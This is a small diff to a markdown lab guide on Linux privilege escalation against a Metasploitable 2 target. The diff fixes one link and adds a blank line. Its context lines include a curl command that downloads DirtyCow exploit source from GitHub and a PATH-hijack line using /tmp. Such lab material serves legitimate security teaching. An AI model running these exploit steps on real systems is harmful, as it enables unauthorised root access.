@@ -223,7 +223,7 @@ This works on old kernels — Metasploitable 2 has one!
 #### ✅ Step-by-Step Guide:
 
 1. On your **Kali machine**, download a DirtyCow exploit from GitHub:
-See: [DirtyCow on Youtube]{https://www.youtube.com/watch?v=YoeuGnF_2Qk) for more info
+See: [DirtyCow on Youtube](https://www.youtube.com/watch?v=YoeuGnF_2Qk) for more info
 ```bash
 curl -O https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
 ```
@@ -387,6 +387,7 @@ export PATH=/tmp:$PATH
   - One step by step Privesc path and root confirmation
   - Step by step attempts at 1 Bonus or Mystery task
 - Submit a 1-paragraph reflection on the escalation path used and what you understand!
+
 
 
 
